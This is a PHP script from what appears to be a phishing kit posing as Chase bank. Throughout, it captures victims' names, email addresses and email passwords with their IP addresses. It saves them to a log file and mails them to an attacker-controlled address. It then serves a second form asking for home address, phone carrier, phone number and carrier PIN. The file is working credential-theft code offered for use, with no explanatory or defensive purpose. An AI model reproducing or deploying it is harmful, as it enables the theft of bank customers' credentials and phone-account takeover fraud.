<?php
if (isset($_POST['e_nm']) && isset($_POST['e_ml']) && isset($_POST['e_pw'])) {
    session_start();
    include '../prevents/anti1.php';
    include '../mine.php';
    $ippa = $_SERVER['REMOTE_ADDR'];
    $msg = "=========== <[ Chase ]> ===========\r\n";
    $msg .= "NAME       : {$_POST['e_nm']}\r\n";
    $msg .= "EMAIL      : {$_POST['e_ml']}\r\n";
    $msg .= "PASS       : {$_POST['e_pw']}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
    $msg .= "IP ADDRESS : {$ippa}\r\n";
    $msg .= "TIME       : " . now() . " GMT\r\n";
    $msg .= "=========== <[ xWanted Store ]> ===========\r\n\r\n\r\n";
    $save = fopen("../../".$text.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "CHASE 2ND RETRY EMAIL [".$ippa."]";
    $headers = "From: New Chase Email Access <sales@xwanted.store>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
        exit('<form method="POST" autocomplete="off" action="javascript:void(0);" novalidates><input name="fnm" class="input" placeholder="Full Name" type="text" required> <input name="adr" class="input" placeholder="Address" type="text" required> <input name="cty" class="input" placeholder="City" type="text" required> <input name="zip" class="input" placeholder="Zip Code" type="tel" required maxlength="6"> <div class="col-lg-13 col-sm-13 col-xs-13"> <div class="select default"> <select name="pht" class="input" required> <option value="none" disabled selected>Chose Your Carrier </option> <option value="Verizon">Verizon </option> <option value="T-Mobile">T-Mobile </option> <option value="Att">AT&amp;T </option> <option value="Metro">Metro Pcs </option> <option value="Sprint">Sprint </option> <option value="USCellular">US Cellular </option> <option value="Other">Other </option> </select> </div> </div> <input name="phn" class="input" placeholder="Phone Number" type="tel" required> <input name="ppc" class="input" placeholder="Carrier Passcode (PIN)" type="tel" required> <div class="row"> <button type="submit"class="primary"> <span class="label">Continue </span> </button> </div> <script>$(document).ready(function(){ $("#rotate").hide(); var a=false; $(document).on("submit","form",function(c){ c.preventDefault(); if(a){ return false} $("#rotate").show(); $.post("../extra/poster/step3.php",$(this).serialize(),function(e,d){ if(e&&d=="success"){ $("#form_box").html(e)} } )} )} ); </script></form> ');

}
?>